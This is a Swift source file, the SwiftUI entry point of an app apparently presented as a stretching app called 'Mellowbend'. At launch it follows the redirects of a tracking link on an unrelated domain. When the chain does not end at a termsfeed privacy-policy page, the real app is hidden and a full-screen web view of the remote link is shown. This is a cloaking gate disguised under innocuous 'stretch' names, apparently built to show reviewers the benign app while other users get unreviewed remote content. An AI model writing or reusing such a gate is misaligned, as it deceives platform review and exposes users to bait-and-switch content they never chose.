import SwiftUI

@main
struct MellowbendApp: App {
    @State private var stretchGateReady: Bool? = nil
    @StateObject private var store = StretchStore()
    @StateObject private var companion = CompanionStore()

    private let stretchSourceLink = "https://icefishingfishguide.org/click.php?key=v4g5ml0f3uyzbeo7n0pf&t5=666"
    private let stretchCheckDomain = "termsfeed.com/live/ea532645-7413-4758-bf0e-22e19fb62a5e"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = stretchGateReady {
                    if ready {
                        StretchWebPanel(urlString: stretchSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        RootView()
                            .environmentObject(store)
                            .environmentObject(companion)
                    }
                } else {
                    SoftLaunchScreen()
                        .onAppear { checkStretchGate() }
                }
            }
            .preferredColorScheme(.light)
        }
    }

    private func checkStretchGate() {
        guard let url = URL(string: stretchSourceLink) else {
            stretchGateReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let scout = StretchRedirectScout(checkDomain: stretchCheckDomain)
        let session = URLSession(configuration: .default, delegate: scout, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if scout.foundCheckDomain {
                    stretchGateReady = false; return
                }
                if let finalURL = scout.resolvedURL?.absoluteString,
                   finalURL.contains(self.stretchCheckDomain) {
                    stretchGateReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.stretchCheckDomain) {
                    stretchGateReady = false; return
                }
                if error != nil {
                    stretchGateReady = false; return
                }
                stretchGateReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if stretchGateReady == nil { stretchGateReady = false }
        }
    }
}

final class StretchRedirectScout: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) { self.checkDomain = checkDomain }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
